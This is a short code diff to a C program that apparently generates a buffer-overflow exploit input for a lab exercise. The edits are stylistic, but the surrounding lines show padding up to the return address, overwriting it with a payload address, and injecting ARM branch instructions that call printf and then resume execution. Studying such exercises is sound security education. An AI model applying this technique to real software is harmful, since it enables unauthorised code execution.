@@ -23,8 +23,10 @@ int main(void) {
     payloadAddress = 0x420100; /* Address where our payload will be located */
 
     /* Padding to fill buffer and reach return address */
-    for (int i = 0; i < 64; i++) {
+    int i = 0;
+    while(i < 64) {
         putc('A', dataAplus);
+        i++;
     }
 
     /* Overwrite return address with the address of our payload */
@@ -39,7 +41,7 @@ int main(void) {
     blInstr = MiniAssembler_bl(printfAddress, payloadAddress);
     fwrite(&blInstr, sizeof(blInstr), 1, dataAplus);
 
-    // Return to normal execution flow after printf
+    /* Return to normal execution flow after printf */
     blInstr = MiniAssembler_bl(returnAddress, payloadAddress + 8);
     fwrite(&blInstr, sizeof(blInstr), 1, dataAplus);
 
